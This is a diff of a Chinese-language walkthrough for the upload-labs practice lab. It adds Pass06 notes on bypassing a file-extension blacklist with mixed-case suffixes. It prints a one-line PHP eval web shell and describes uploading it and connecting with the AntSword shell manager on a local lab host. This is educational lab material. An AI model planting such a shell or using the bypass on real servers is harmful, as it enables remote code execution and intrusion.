@@ -195,6 +195,12 @@ AddType application/x-httpd-php .php .phtml .php5 .php3
 
 
 
++ 这里有个问题，<code>php</code>版本不能为<code>nts</code>，不然就会出现<code>.php5</code>文件无法解析的情况
+
+![Pass03_6](./img/Pass03_6.png)
+
+
+
 ## Pass04
 
 + 查看下提示信息
@@ -372,9 +378,7 @@ SetHandler application/x-httpd-php .png
 
 
 
-+ 非<code>nts</code>版本没有这样的条件
-
-这关攻关失败，容后继续
++ 非<code>nts</code>版本没有这样的条件导致这关攻关失败
 
 
 
@@ -522,4 +526,68 @@ ps: 蚁剑相关的文档查看对应的url:
 	https://github.com/AntSwordProject/AntSword-Loader
 	https://github.com/eastmountyxz/AntSword-Experiment
 ~~~
+
+
+
+## Pass06
+
+![Pass06_1](./img/Pass06_1.png)
+
++ 查看源码，和第四关对比发现这关没有转换大小写的代码，逆推一下 最后要得到<code>xxx.php</code>那么<code>$file_ext</code>就要是php 黑名单里面就禁止了<code>pHp</code>，没有禁止<code>phP</code> 、<code>Php</code>，这样可以上传大小写混合的后缀名绕过
+
+
+
++ 这里版本得选择非<code>nts</code>版本的才能成功，如果是<code>nts</code>版本会报<code>http 500</code>服务器内部错误，不知道什么原因。在这里我上传了<code>6.Php</code>
+
+![Pass06_2](./img/Pass06_2.PNG)
+
+
+
++ 上传之后由于是<code>nts</code>版本的<code>php</code>版本，所以报了<code>http 500</code>服务器内部错误
+
+![Pass06_3](./img/Pass06_3.PNG)
+
+
+
++ 换一种方法，用蚁剑连接
+
+  + 先定义脚本<code>SixSecondMethod</code>
+
+  ~~~ shell
+  <?php @eval($_POST['SixSecond']); ?>
+  ~~~
+
+  ![Pass06_4](./img/Pass06_4.PNG)
+
+
+
++ + 上传<code>SixSecondMethod</code>文件
+
+![Pass06_5](./img/Pass06_5.png)
+
+
+
++ + 复制对应的<code>SixSecondMethod</code>文件地址
+
+  ~~~ shell
+  http://192.168.31.126:8080/upload-labs/upload/202401310207471991.Php
+  ~~~
+
+  ![Pass06_6](./img/Pass06_6.png)
+
+
+
++ + 使用蚁剑添加数据并配置相关信息
+
+  ![Pass06_7](./img/Pass06_7.png)
+
+
+
++ + 最后发现配置成功，但由于<code>php</code>版本是<code>nts</code>导致了服务器出现<code>500</code>错误无法成功拿到<code>shell</code>
+
+  ![Pass06_8](./img/Pass06_8.PNG)
+
+
+
+## Pass07
 
